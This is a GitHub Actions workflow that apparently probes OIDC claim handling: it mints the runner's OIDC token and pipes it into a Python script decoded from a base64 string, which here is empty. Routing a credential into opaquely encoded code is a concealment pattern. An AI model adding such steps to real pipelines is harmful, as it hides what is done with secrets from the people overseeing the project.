name: hc2-oidc-delimiter-probe
on:
  workflow_dispatch:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mint and decode OIDC token (claims only, raw token never printed)
        run: |
          set -euo pipefail
          printf '%s' '' | base64 -d > /tmp/probe.py
          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=hc2-delimiter-probe" | python3 /tmp/probe.py
